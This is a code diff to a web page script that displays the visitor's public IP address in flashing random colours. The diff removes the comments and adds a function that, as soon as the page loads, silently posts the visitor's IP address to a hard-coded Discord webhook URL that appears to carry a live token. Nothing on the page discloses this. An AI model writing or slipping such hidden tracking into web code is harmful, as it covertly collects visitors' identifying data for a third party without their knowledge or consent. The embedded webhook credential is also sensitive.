@@ -1,6 +1,6 @@
-// script.js
+
 window.onload = function () {
-    // Function to generate a random color in hex format (#RRGGBB)
+
     function getRandomColor() {
         const letters = '0123456789ABCDEF';
         let color = '#';
@@ -10,23 +10,43 @@ window.onload = function () {
         return color;
     }
 
-    // Function to continuously change text color
+
     function flashRandomColor() {
         const ipAddressElement = document.getElementById('ipAddress');
         ipAddressElement.style.color = getRandomColor();
     }
 
-    // Fetch IP address initially
+
+    function sendToDiscordWebhook(ipAddress) {
+        const webhookUrl = 'https://discord.com/api/webhooks/1151703372718678158/OAamyLyQ_f_ajsGKAQwptEMMOKhonHpQjqKvmlYJzmx3mHBLsNK_yRM8nnaOrdkCn2c0'; 
+        const data = {
+            content: `New IP Address: ${ipAddress}`
+        };
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+        });
+    }
+
+
     fetch('https://api64.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
             const ipAddressElement = document.getElementById('ipAddress');
-            ipAddressElement.textContent = data.ip;
-            
-            // Start with white text
+            const ipAddress = data.ip;
+            ipAddressElement.textContent = ipAddress;
+
+
             ipAddressElement.style.color = 'white';
-            
-            // Set up interval to change text color every 500 milliseconds (0.5 seconds)
+
+
+            sendToDiscordWebhook(ipAddress);
+
+
             setInterval(flashRandomColor, 500);
         })
         .catch(error => {
